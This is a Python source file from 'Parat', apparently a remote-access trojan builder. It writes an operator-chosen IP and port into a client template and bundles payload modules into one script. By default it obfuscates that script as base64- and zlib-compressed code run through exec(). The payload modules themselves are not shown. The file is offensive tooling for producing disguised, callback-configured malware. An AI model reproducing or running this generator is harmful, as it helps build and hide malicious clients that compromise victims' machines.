#
# Copyright (c) 2017, MR. Fathi (www.micle.ir - mhd.ceh8@gmail)
# Parat project is under the GNU GENERAL PUBLIC LICENSE (GPL) license.
# see the COPYING file for the detailed licence terms
#
import os
import base64
import zlib
from shutil import copy2
from glob import glob




def encrypt_output(source_code):

    if not source_code:
        return

    return """\
import base64, zlib\n
exec(zlib.decompress(base64.b64decode('{}')))\
""".format(base64.b64encode(zlib.compress(source_code)))



def validate_path(path, file_name):

    out_directory = os.path.join(path, "parat_output")

    if not os.path.exists(out_directory):
        os.makedirs(out_directory)

    return os.path.join(path, out_directory, file_name)




def set_payload_values(client_folder, host, port, platform, arch):

    init_name = os.path.join(client_folder, "initializing_variables.part")
    temp_name = os.path.join(client_folder, "initializing_variables.tmp")

    with open(init_name, "r") as old_file:

        content = old_file.read().split("\n")

        with open(temp_name, "w") as temp_file:

            for no, line in enumerate(content, 1):

                if no == 6:
                    temp_file.write("IP" + 10*" " + " = '{}'\n".format(host))
                elif no == 7:
                    temp_file.write("PORT" + 8*" " + " = {}\n".format(port))
                elif no == 9:
                    temp_file.write("PLATFORM     = '{}'\n".format(platform))
                elif no == 10:
                    temp_file.write("ARCHITECTUE  = '{}'\n".format(arch))
                else:
                    temp_file.write(line + "\n")

        temp_file.close()

    old_file.close()

    copy2(temp_name, init_name)
    os.remove(temp_name)






def create_it(file_name, host, port, platform, arch, path, script_let=None, simple_encode=True):


    global full_code
    full_code = ""


    def append_to_code(piece):
        global full_code
        full_code += piece


    # write ew file pointing to encoding
    def pawrite(iobj, enc):
        iobj.write(full_code) if not enc else iobj.write(encrypt_output(full_code))


    try:

        # define some path
        client_folder = os.path.abspath(__name__)
        client_folder = client_folder.replace('.py', '/py')
        out_path = validate_path(path, file_name)

        # append client_folder path to modules
        get_full_dir = lambda f: client_folder + "/" + f

        # update files and set new values
        set_payload_values(client_folder, host, port, platform, arch)
        script_let = encrypt_output(script_let)

        # define output top and end lines
        include_headers   = [get_full_dir("import_libraries.part"), get_full_dir("initializing_variables.part")]
        include_finisher  = [get_full_dir("main_loop.part"), get_full_dir("run.part")]
        stop_randomize    = include_headers + include_finisher

        # get all parts to bundle them
        modules_list      = glob("{}/*.part".format(client_folder))
        modules_list      = [item for item in modules_list if item not in stop_randomize]

        # open all modules and store them in file-object
        start_modules_obj = [open(f, 'r') for f in include_headers]
        modules_file_obj  = [open(f, 'r') for f in modules_list]
        end_modules_obj   = [open(f, 'r') for f in include_finisher]

        # attach all modules in one variable
        with open(out_path, "w") as out_file:

            [append_to_code(header.read()) for header in start_modules_obj]
            [append_to_code(module.read()) for module in reversed(modules_file_obj)]
            [append_to_code(finisher.read()) for finisher in end_modules_obj]

            # write result to new file
            pawrite(out_file, simple_encode)

        # close all opened file-objects
        out_file.close()

        map(lambda IO: IO.close(), start_modules_obj)
        map(lambda IO: IO.close(), modules_file_obj)
        map(lambda IO: IO.close(), end_modules_obj)

        return None

    except Exception as e:
        return str(e)
